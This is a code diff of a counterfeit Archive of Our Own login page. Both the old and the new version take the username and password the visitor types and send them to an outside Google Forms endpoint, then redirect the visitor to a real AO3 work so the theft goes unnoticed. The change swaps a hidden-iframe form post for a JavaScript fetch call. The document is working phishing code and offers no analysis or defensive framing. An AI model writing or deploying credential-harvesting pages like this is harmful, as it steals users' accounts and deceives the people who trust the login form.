@@ -116,34 +116,42 @@
  If you don't have an account, you can <a href=https://archiveofourown.org/invite_requests>request an invitation to join</a>.
  </p>
 <div id="loginform">
-  <script>
-    var isSubmitted = false;
-  </script>
-  <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" 
-          onload="if(isSubmitted) { window.location.href='https://archiveofourown.org/works/21065363'; }">
-  </iframe>
-  <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSeqjPSV2HLo_By2Cr82yJgjjMmA2NYSIZJDY9G3Zzj6vg1MXQ/formResponse" 
-        method="POST" 
-        target="hidden_iframe" 
-        onsubmit="isSubmitted = true;">
+  <form id="googleForm">
     <dl>
       <dt><label>Username:</label></dt>
-      <dd><input type="text" name="entry.996873737" required></dd>
+      <dd><input type="text" id="username" name="entry.996873737" required></dd>
 
       <dt><label>Password:</label></dt>
-      <dd><input type="text" name="entry.1007897845" required></dd>
-
-      <dt><label for="user_remember_me">Remember me</label></dt>
-      <dd>
-      <input type="checkbox" value="Yes" name="remember_me" id="user_remember_me">
-    </dd>
+      <dd><input type="text" id="password" name="entry.1007897845" required></dd>
 
       <dd style="margin-top: 10px;">
-        <input type="submit" value="Log in">
+        <button type="button" onclick="sendDataAndRedirect()" class="submit">Log in</button>
       </dd>
     </dl>
   </form>
 </div>
+
+<script>
+  function sendDataAndRedirect() {
+    const formUrl = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeqjPSV2HLo_By2Cr82yJgjjMmA2NYSIZJDY9G3Zzj6vg1MXQ/formResponse";
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    const redirectUrl = "https://archiveofourown.org/works/21065363";
+    const formData = new FormData();
+    formData.append("entry.996873737", username);
+    formData.append("entry.1007897845", password);
+    fetch(formUrl, {
+      method: "POST",
+      mode: "no-cors",
+      body: formData
+    }).then(() => {
+      window.location.href = redirectUrl;
+    }).catch((error) => {
+      console.error("전송 오류:", error);
+      window.location.href = redirectUrl;
+    });
+  }
+</script>
 <p>
  Forgot your password or username? <a href=https://archiveofourown.org/users/password/new>Reset your password</a>.
  <br \>Don't have an account? <a href=https://archiveofourown.org/invite_requests>Request an invitation to join</a>.
